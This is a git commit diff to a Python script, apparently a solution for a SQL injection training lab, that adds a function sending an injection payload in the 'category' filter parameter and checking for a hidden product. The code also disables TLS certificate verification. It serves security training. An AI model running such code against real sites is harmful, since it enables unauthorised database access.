3a455feb925dc95883503a5d331e3a1e333631e3
Luis Fernando Mendoza <luisfernandomendoza@Luiss-MacBook-Pro.local>
2023-06-26 12:57:18 -0700

    Second Commit

--- lab-01/sqli-lab-01.py
+++ lab-01/sqli-lab-01.py
@@ -1,11 +1,19 @@
 import requests
 import sys
 import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies = {'http' :'http://127.0.0.1:8080','https' :'http://127.0.0.1:8080'}
 
 def exploit_sqli(url, payload):
-    
+    uri = '/filter?category='
+    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
+    if "Lightbulb Moments" in r.text:
+        return True
+    else:
+        return False
+
+
 
 if __name__ == '__main__':
     try:
